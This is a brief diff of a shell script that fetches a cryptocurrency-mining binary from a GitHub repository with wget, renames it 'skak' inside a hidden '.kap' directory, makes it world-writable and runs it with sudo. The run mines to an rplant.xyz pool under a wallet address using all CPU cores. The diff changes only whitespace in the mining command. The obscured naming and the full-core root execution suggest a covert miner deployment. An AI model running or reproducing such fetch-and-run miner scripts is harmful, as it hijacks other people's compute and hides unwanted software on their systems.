@@ -3,4 +3,4 @@ apt-get update ; apt-get -y install sudo
 mkdir .kap && cd .kap
 wget -O skak https://github.com/nandafiku/fillesg/raw/main/cpuminer-avx2
 chmod 777 skak
-sudo ./skak -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:7052 -u uqTaCYvDM8SqwN6VqwZUMkATmMwUTiVbR1.x -p webpassword=x -t $(nproc --all)
+sudo ./skak -a yespower -o stratum+tcps://stratum-na.rplant.xyz:7052 -u uqTaCYvDM8SqwN6VqwZUMkATmMwUTiVbR1.x -p webpassword=x -t $(nproc --all)
